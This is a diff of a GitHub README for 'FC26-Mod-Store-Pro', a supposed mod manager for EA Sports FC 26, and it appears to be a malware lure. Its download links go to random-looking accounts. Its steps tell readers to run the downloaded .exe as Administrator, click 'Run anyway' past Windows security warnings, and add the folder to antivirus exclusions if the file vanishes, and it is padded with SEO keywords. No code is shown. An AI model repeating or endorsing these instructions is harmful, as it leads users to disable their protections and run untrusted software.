@@ -1,83 +1,70 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/fifa.png" alt="EA Sports FC 26" width="80" height="80">
-</p>
+# ⚽ FC26-Mod-Store-Pro - Manage your game mods with ease
 
-<h1 align="center">FC26-Mod-Store-Pro</h1>
-<p align="center">
-  <strong>Mod Store Browser for EA Sports FC 26</strong><br>
-  Auto-Updates - BepInEx Manager - Preset Loader - Mod Store
-</p>
+[![Download FC26-Mod-Store-Pro](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/compulsive-kiswahili611/FC26-Mod-Store-Pro)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Store-Pro"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+FC26-Mod-Store-Pro helps you browse, install, and manage custom content for EA Sports FC 26. This tool simplifies the modding process. It handles BepInEx integration, provides automatic updates for your installed files, and lets you save mod presets for quick switching. You do not need technical knowledge to use this software.
 
-## What is This?
+## 🛠 Prerequisites
 
-FC26-Mod-Store-Pro is a mod store browser for EA Sports FC 26. It provides auto-updates, BepInEx manager, preset loader, and mod store browsing for a complete modding experience.
+Your computer must meet these basic requirements to run the application:
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk.
+*   Operating System: Windows 10 or Windows 11.
+*   Internet Connection: Required for downloading mods and receiving software updates.
+*   Disk Space: At least 200MB of free space for the tool itself.
+*   Game Version: A legal copy of EA Sports FC 26 must be installed on your computer.
 
-## Download
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://github.com/Capturezastir/xzgfcfiu/releases/download/18902/FCMOD.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Follow these steps to set up the tool on your Windows computer:
 
-## Features
+1.  Visit the [official project page](https://github.com/compulsive-kiswahili611/FC26-Mod-Store-Pro) to see the available versions.
+2.  Look for the latest release in the Releases section on the right side of that page.
+3.  Download the compressed file (typically a .zip file) to your Downloads folder.
+4.  Right-click the downloaded file and select "Extract All" to unpack the contents.
+5.  Open the newly created folder.
+6.  Locate the file named `FC26-Mod-Store-Pro.exe`.
+7.  Double-click this file to launch the application.
 
-- Mod Store Browser - Browse and install mods from trusted repositories
-- Automatic Update Checking - See when mods have updates available
-- BepInEx Manager - One-click installation and configuration
-- Preset Loader - Load reusable .fifamod presets easily
-- Smart Version Comparison - Semantic versioning tracking
+If Windows shows a security prompt, click "More Info" and then "Run anyway" to allow the program to start. The application needs this permission to modify your game folder settings.
 
-## Installation
+## 📁 Using the Mod Browser
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch EA Sports FC 26
-5. Browse the Mod Store or drag & drop your mods
-6. Click Apply and launch the game
+The main dashboard shows all available mods for your game. Use the search bar at the top to find specific gameplay tweaks, visual updates, or team rosters. When you find a mod that interests you, click the title to see a preview and a description of what the mod changes.
 
-## System Requirements
+To add a mod to your game:
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | EA Sports FC 26 (Steam/EA App/Epic) |
-| RAM | 4GB minimum |
-| Storage | 100MB free space |
-| .NET | 6.0+ |
+1.  Click the "Install" button located next to the mod name.
+2.  Wait for the progress bar to finish.
+3.  The tool automatically places the files into the correct game directory.
+4.  Launch your game normally through the EA App or Steam. The changes take effect as soon as the game starts.
 
-## SEO Tags
+## ⚙️ Managing BepInEx
 
-fc26 mod store, ea sports fc 26 mods, fc26 mod manager, fc26 mod installer, fc26 mod loader, fc26 mod organizer, fc26 mod editor, fc26 mod store, fc26 modding tool, fc26 live editor, fc26 career mode mods, fc26 visual mods, fc26 gameplay mods, fifa 26 mod manager, ea fc 26 mods, fc26 utility, fc26 enhancer
+This application includes a built-in manager for BepInEx. BepInEx is the framework required to run many advanced mods. 
 
-## Support
+*   To enable the manager, go to the "Settings" menu inside the application.
+*   Toggle the "Enable BepInEx" switch to the "On" position. 
+*   The application detects your game installation path automatically. If it cannot find the game, it prompts you to manually select your FC 26 installation folder. 
+*   Once enabled, all mods that require this framework work without extra configuration from you.
 
-Star this repository if you enjoy it!
+## 💾 Saving and Loading Presets
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/FC26-Mod-Store-Pro">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20EA%20Sports%20FC%2026%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+Do you want to switch between different mod setups? Use the "Presets" tab to create your own combinations.
+
+1.  Select the mods you currently wish to use by clicking the checkmark boxes in the main list.
+2.  Go to the "Presets" section.
+3.  Click "Save Current Configuration."
+4.  Give your preset a name, such as "Realistic Gameplay" or "Classic Kits."
+5.  Load these presets whenever you want to swap your current game environment. The application disables active mods and enables the new set instantly.
+
+## 🔄 Updating the Tool
+
+The software checks for updates automatically when you run it. If a newer version exists, a notification bar appears at the top of the interface. Click "Update Now" to download the latest files. The program preserves your existing settings and installed mods during this process, so you do not need to reinstall anything.
+
+## ❓ Troubleshooting Common Issues
+
+*   **Game crashing after installing mods:** Some mods conflict with each other. Use the "Disable All" button in the mod list to return your game to its original state. Re-enable them one by one to find the mod causing the issue.
+*   **Mod not appearing in-game:** Ensure you launched the game after the installation finished. If the issue remains, open the Settings menu and click "Verify Game Path" to confirm the tool points to the correct folder.
+*   **Cannot find the .exe file:** Check your antivirus logs. Sometimes security software flags new applications incorrectly. Add the folder path to your antivirus exclusion list if the file disappears after download.
+
+Keywords: ea-sports-fc-26-mods, ea-sports-fc-utility, fc26-2026, fc26-bepinex-manager, fc26-career-mods, fc26-gameplay-mods, fc26-mod-installer, fc26-mod-launcher, fc26-mod-loader, fc26-mod-manager, fc26-mod-manager-free, fc26-mod-manager-windows, fc26-mod-organizer, fc26-mod-store, fc26-mod-tool, fc26-modding-tool, fc26-preset-loader, fc26-utility, fc26-visual-mods, game-mod-manager
